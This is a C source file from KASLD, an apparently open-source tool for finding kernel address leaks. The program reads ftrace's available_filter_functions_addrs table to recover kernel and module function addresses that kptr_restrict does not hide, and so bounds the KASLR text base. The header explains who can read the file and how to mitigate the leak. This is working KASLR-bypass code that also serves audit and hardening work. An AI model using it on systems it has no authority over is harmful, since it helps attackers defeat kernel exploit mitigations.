// This file is part of KASLD - https://github.com/bcoles/kasld
//
// Harvest kernel text (and module) virtual addresses from the ftrace
// available_filter_functions_addrs table (/sys/kernel/tracing/...).
//
// For every ftraceable function the kernel prints one line
//   <hex-ip> <symbol name> [module]
// where <hex-ip> is the raw fentry/mcount call-site address of the function.
// ftrace prints it with a bare "%lx" (kernel/trace/ftrace.c) — NOT through %pK
// and NOT behind the kallsyms_show_value() gate — so unlike /proc/kallsyms the
// address is not subject to kptr_restrict: whoever can open the file reads real
// addresses even under kptr_restrict=2. The only gate is the tracefs file mode
// (0440) plus kernel lockdown; tracefs honours a "gid=" mount option, so on a
// non-Android system configured for unprivileged tracing (a "tracing" group
// with a gid=-mounted tracefs) the table is readable without root. Note: stock
// SELinux-enforcing Android denies its shell domain these tracefs tables even
// inside the AID_READTRACEFS group (a dedicated policy type isolates them), so
// this is not an Android-shell vector.
//
// Each entry is an interior point of the kernel image (or a module): the lowest
// bounds the text base from above, the highest bounds it from below (with the
// image size). Unlike printk_formats (which lists only trace_printk() format
// strings and is usually empty), this table is populated unconditionally
// whenever CONFIG_DYNAMIC_FTRACE is set — nearly every distro kernel — and
// lists thousands of functions, so the bound is both reliable and tight.
//
// Leak primitive:
//   Data leaked:      kernel/module function virtual addresses (fentry sites)
//   Kernel subsystem: kernel/trace — the dyn_ftrace record table
//   Data structure:   struct dyn_ftrace (rec->ip) over ftrace_pages
//   Address type:     virtual (kernel text, or module)
//   Method:           parsed (tracefs table read)
//   Status:           information exposure (raw %lx, no kptr_restrict gate)
//   Access check:     tracefs mount perms only (file 0440); NOT kptr_restrict
//
// Mitigations:
//   Mount tracefs root-only (omit gid=) to deny unprivileged reads. There is no
//   kptr_restrict gate on the printed address, so kptr_restrict does not help.
//   Kernel lockdown (LOCKDOWN_TRACEFS) blocks the open under Secure Boot.
//
// A future enhancement could pin the text base exactly by resolving a named
// function's offset, but that needs a per-build table of symbol offsets; this
// component stays version-independent by bounding from the harvested addresses.
// ---
// <bcoles@gmail.com>

#include "include/kasld/api.h"
#include "include/kasld/cli.h"
#include <errno.h>
#include <stdio.h>
#include <string.h>

KASLD_EXPLAIN(
    "Reads kernel and module function virtual addresses from the ftrace "
    "available_filter_functions_addrs table (/sys/kernel/tracing/...). Every "
    "ftraceable function is printed as '<addr> <name> [module]' with a bare "
    "%lx address, with no kptr_restrict / kallsyms_show_value gate, so it "
    "discloses real kernel addresses where /proc/kallsyms would be masked. The "
    "file is mode 0440 under tracefs (gid=-mountable), so it can be readable "
    "without root on systems set up for unprivileged tracing. Each address is "
    "an interior point bounding the kernel text base. Unlike printk_formats, "
    "the table is populated whenever CONFIG_DYNAMIC_FTRACE is set.");

KASLD_META("method:parsed\n"
           "phase:inference\n"
           "discloses:virtual\n"
           "note:bypasses_kptr_restrict\n");

static const char *const PATHS[] = {
    "/sys/kernel/tracing/available_filter_functions_addrs",
    "/sys/kernel/debug/tracing/available_filter_functions_addrs",
};

int main(int argc, char **argv) {
  kasld_cli(argc, argv);

  FILE *f = NULL;
  const char *path = NULL;
  for (size_t i = 0; i < sizeof(PATHS) / sizeof(PATHS[0]); i++) {
    f = kasld_fopen(PATHS[i], "r");
    if (f) {
      path = PATHS[i];
      break;
    }
    if (errno == EACCES || errno == EPERM)
      return KASLD_EXIT_NOPERM;
  }
  if (!f)
    return KASLD_EXIT_UNAVAILABLE;

  kasld_info("reading %s ...", path);

  unsigned long text_lo = 0, text_hi = 0, mod_lo = 0, mod_hi = 0;
  int have_text = 0, have_mod = 0;
  char line[1024];

  /* Lines: "<hex-ip> <symbol>[ [module]]". kasld_addr_parse (base 16) consumes
   * the bare hex without a 0x prefix and refuses any address wider than this
   * build's word — the 32-bit-reading-a-64-bit-table soundness guard. */
  while (fgets(line, sizeof(line), f)) {
    unsigned long a;
    const char *e;
    if (!kasld_addr_parse(line, 16, &a, &e) || a == 0)
      continue;
    /* The address is always followed by a space and the symbol name; a line
     * that is not shaped that way is not a data row. */
    if (*e != ' ' && *e != '\t')
      continue;
    while (*e == ' ' || *e == '\t')
      e++;
    if (*e == '\0' || *e == '\n')
      continue;
    /* ftrace prints "__ftrace_invalid_address___<n>" when a record's ip does
     * not resolve to a symbol (a weak alias, or a section-boundary artifact);
     * skip those so only cleanly-resolved call sites bound the base. */
    if (strncmp(e, "__ftrace_invalid_address___", 27) == 0)
      continue;
    if (kasld_addr_is_kernel_text(a)) {
      if (!have_text || a < text_lo)
        text_lo = a;
      if (!have_text || a > text_hi)
        text_hi = a;
      have_text = 1;
    } else if (kasld_addr_is_module_band(a)) {
      if (!have_mod || a < mod_lo)
        mod_lo = a;
      if (!have_mod || a > mod_hi)
        mod_hi = a;
      have_mod = 1;
    }
  }
  fclose(f);

  if (!have_text && !have_mod) {
    kasld_info(
        "no kernel/module addresses in available_filter_functions_addrs");
    return KASLD_EXIT_UNAVAILABLE;
  }

  /* Emit the lowest and highest witness per region as interior samples: the low
   * point bounds the text base from above, the high point from below (with the
   * image size). Both are interior samples (pos=interior). */
  if (have_text) {
    kasld_info("kernel text function addresses: 0x%lx-0x%lx", text_lo, text_hi);
    kasld_result_sample(KASLD_TYPE_VIRT, REGION_KERNEL_TEXT, text_lo,
                        "ftrace_avail", CONF_PARSED);
    if (text_hi != text_lo)
      kasld_result_sample(KASLD_TYPE_VIRT, REGION_KERNEL_TEXT, text_hi,
                          "ftrace_avail", CONF_PARSED);
  }
  if (have_mod) {
    kasld_info("module function addresses: 0x%lx-0x%lx", mod_lo, mod_hi);
    kasld_result_sample(KASLD_TYPE_VIRT, REGION_MODULE_BAND, mod_lo,
                        "ftrace_avail", CONF_PARSED);
    if (mod_hi != mod_lo)
      kasld_result_sample(KASLD_TYPE_VIRT, REGION_MODULE_BAND, mod_hi,
                          "ftrace_avail", CONF_PARSED);
  }
  return 0;
}
